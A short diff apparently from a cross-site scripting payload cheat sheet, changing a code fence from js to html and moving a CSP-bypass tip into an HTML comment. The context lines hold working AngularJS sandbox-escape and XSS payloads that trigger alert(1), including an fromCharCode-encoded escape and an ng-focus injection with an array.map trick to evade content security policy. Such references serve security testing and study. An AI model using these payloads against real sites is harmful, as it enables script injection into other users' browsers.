@@ -119,10 +119,9 @@ $eval('x=alert(1)')
 // fromCharCode() translates to: x=alert(1)
 toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
-```js
+```html
 <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
-// Or use array.map() to hide from the CSP:
-[1].map(alert)
+<!-- Or use array.map() to hide from the CSP: "[1].map(alert)" -->
 ```
 
 ### XSS->CSRF
